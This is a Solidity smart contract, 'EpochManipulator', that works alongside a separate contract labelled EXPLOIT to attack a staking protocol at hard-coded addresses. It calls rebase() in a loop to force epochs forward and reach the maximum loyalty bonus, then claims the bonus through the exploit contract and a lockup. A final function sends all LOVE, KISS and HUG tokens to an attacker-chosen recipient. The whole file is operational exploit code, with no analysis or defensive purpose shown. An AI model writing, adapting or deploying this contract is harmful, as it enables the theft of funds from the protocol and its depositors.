// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IHyperStaking {
    function rebase() external;
    function epoch() external view returns (uint256 length, uint256 number, uint256 endBlock, uint256 distribute);
    function getLoyaltyRatio(address _depositor) external view returns (uint8);
    function getBonus(address _depositor) external view returns (uint256);
    function bonusInfo(address _user) external view returns (uint256 epoch, uint256 principal);
    function unstake(uint256 _amount, uint256 _bonus, bool _trigger) external;
}

interface IExploit {
    function step5_claimBonus(uint256 unstakeKissAmount) external;
    function step5_claimMaxBonus() external;
    function step6_claimFromLockup() external;
    function step7_withdrawToOwner() external;
    function step6and7_claimAndWithdraw() external;
    function depositHUG(uint256 amount) external;
    function getExploitState() external view returns (
        uint256 kissBalance,
        uint256 loveBalance,
        uint256 hugBalance,
        uint256 currentPrincipal,
        uint256 currentEarned,
        uint256 availableBonus,
        uint8 loyaltyRatio
    );
    function getLockupStatus() external view returns (
        uint256 pendingPayout,
        uint256 vestingRemaining,
        uint256 lastClaimTime,
        uint256 unstakeTime,
        uint256 percentVested,
        bool canClaimFull
    );
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
}

interface IStakingLockup {
    function claim(bool _stake) external;
    function claimInfo(address _depositor) external view returns (uint256 payout, uint256 vesting, uint256 lastTime, uint256 unstakeTime);
    function percentVestedFor(address _depositor) external view returns (uint256);
    function pendingPayoutFor(address _depositor) external view returns (uint256);
}

contract EpochManipulator {
    address public constant STAKING = 0x31dd9Be51cC7A96359cAaE6Cb4f5583C89D81985;
    address public constant LOCKUP = 0x963D655522C6360Df782C27912d7A74Ab89D98D9;
    address public constant EXPLOIT = 0xE4913F34fC40886EB97E1613C6834662A16687Bc;
    address public constant LOVE = 0x9505dbD77DaCD1F6C89F101b98522D4b871d88C5;
    address public constant KISS = 0x67e248F9810D4D121ab2237Eb33D21f646011720;
    address public constant HUG = 0x153629b8CE84F5e6DD6044af779aA37aDB431393;

    address public owner;
    address public targetRecipient;

    uint256 public rebasesDone;
    uint256 public loyaltyAchieved;
    uint256 public bonusExtracted;

    event RebasesCompleted(uint256 count, uint256 newEpochNumber, uint8 newLoyalty);
    event BonusClaimed(uint256 bonusAmount, uint256 totalLove);
    event FundsWithdrawn(address recipient, uint256 loveAmount);

    constructor(address _targetRecipient) {
        owner = msg.sender;
        targetRecipient = _targetRecipient;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "!owner");
        _;
    }

    function spamRebase(uint256 count) external {
        for (uint256 i = 0; i < count; i++) {
            IHyperStaking(STAKING).rebase();
        }

        (, uint256 epochNumber,,) = IHyperStaking(STAKING).epoch();
        uint8 loyalty = IHyperStaking(STAKING).getLoyaltyRatio(EXPLOIT);

        rebasesDone += count;
        loyaltyAchieved = loyalty;
        emit RebasesCompleted(count, epochNumber, loyalty);
    }

    function spamRebaseToMaxLoyalty() external {
        (uint256 userEpoch,) = IHyperStaking(STAKING).bonusInfo(EXPLOIT);
        (, uint256 currentEpoch,,) = IHyperStaking(STAKING).epoch();

        uint256 epochPassed = currentEpoch > userEpoch ? currentEpoch - userEpoch : 0;
        uint256 rebasesNeeded = epochPassed >= 144 ? 0 : 144 - epochPassed;
        require(rebasesNeeded > 0, "Already at 100% loyalty");
        uint256 toRebase = rebasesNeeded + 1;

        for (uint256 i = 0; i < toRebase; i++) {
            IHyperStaking(STAKING).rebase();
        }

        (, uint256 epochNumber,,) = IHyperStaking(STAKING).epoch();
        uint8 loyalty = IHyperStaking(STAKING).getLoyaltyRatio(EXPLOIT);
        rebasesDone += toRebase;
        loyaltyAchieved = loyalty;
        emit RebasesCompleted(toRebase, epochNumber, loyalty);
    }

    function rebasesNeeded() external view returns (uint256) {
        (uint256 userEpoch,) = IHyperStaking(STAKING).bonusInfo(EXPLOIT);
        (, uint256 currentEpoch,,) = IHyperStaking(STAKING).epoch();

        uint256 epochPassed = currentEpoch > userEpoch ? currentEpoch - userEpoch : 0;
        return epochPassed >= 144 ? 0 : 144 - epochPassed;
    }


    function depositHUGToExploit(uint256 amount) external onlyOwner {
        IERC20(HUG).transferFrom(msg.sender, address(this), amount);
        IERC20(HUG).approve(EXPLOIT, amount);
        IERC20(HUG).transfer(EXPLOIT, amount);
    }

    function claimBonusViaExploit(uint256 kissToUnstake) external onlyOwner {
        IExploit(EXPLOIT).step5_claimBonus(kissToUnstake);
    }

    function directUnstakeWithBonus(uint256 kissAmount, uint256 bonusAmount) external onlyOwner {
        IERC20(KISS).approve(STAKING, kissAmount);
        IHyperStaking(STAKING).unstake(kissAmount, bonusAmount, true);
    }

    function claimFromLockup() external onlyOwner {
        IStakingLockup(LOCKUP).claim(false);
    }

    function withdrawAllToTarget() external onlyOwner {
        uint256 loveBal = IERC20(LOVE).balanceOf(address(this));
        uint256 kissBal = IERC20(KISS).balanceOf(address(this));
        uint256 hugBal = IERC20(HUG).balanceOf(address(this));

        if (loveBal > 0) {
            IERC20(LOVE).transfer(targetRecipient, loveBal);
            bonusExtracted = loveBal;
        }
        if (kissBal > 0) IERC20(KISS).transfer(targetRecipient, kissBal);
        if (hugBal > 0) IERC20(HUG).transfer(targetRecipient, hugBal);

        emit FundsWithdrawn(targetRecipient, loveBal);
    }

    function emergencyWithdraw() external onlyOwner {
        uint256 loveBal = IERC20(LOVE).balanceOf(address(this));
        uint256 kissBal = IERC20(KISS).balanceOf(address(this));
        uint256 hugBal = IERC20(HUG).balanceOf(address(this));

        if (loveBal > 0) IERC20(LOVE).transfer(owner, loveBal);
        if (kissBal > 0) IERC20(KISS).transfer(owner, kissBal);
        if (hugBal > 0) IERC20(HUG).transfer(owner, hugBal);
    }

    function getEpochInfo() external view returns (
        uint256 length,
        uint256 number,
        uint256 endBlock,
        uint256 distribute,
        uint256 currentBlock,
        uint256 blocksBehind
    ) {
        (length, number, endBlock, distribute) = IHyperStaking(STAKING).epoch();
        currentBlock = block.number;
        blocksBehind = currentBlock > endBlock ? currentBlock - endBlock : 0;
    }

    function getExploitState() external view returns (
        uint256 kissBalance,
        uint256 loveBalance,
        uint256 hugBalance,
        uint256 currentPrincipal,
        uint256 currentEarned,
        uint256 availableBonus,
        uint8 loyaltyRatio
    ) {
        return IExploit(EXPLOIT).getExploitState();
    }

    function getExploitLockupStatus() external view returns (
        uint256 pendingPayout,
        uint256 vestingRemaining,
        uint256 lastClaimTime,
        uint256 unstakeTime,
        uint256 percentVested,
        bool canClaimFull
    ) {
        return IExploit(EXPLOIT).getLockupStatus();
    }

    function checkLoyaltyAndBonus() external view returns (
        uint8 loyalty,
        uint256 bonus,
        uint256 hugBalanceOfExploit
    ) {
        loyalty = IHyperStaking(STAKING).getLoyaltyRatio(EXPLOIT);
        bonus = IHyperStaking(STAKING).getBonus(EXPLOIT);
        hugBalanceOfExploit = IERC20(HUG).balanceOf(EXPLOIT);
    }

    function setTargetRecipient(address _target) external onlyOwner {
        targetRecipient = _target;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid owner");
        owner = newOwner;
    }
}
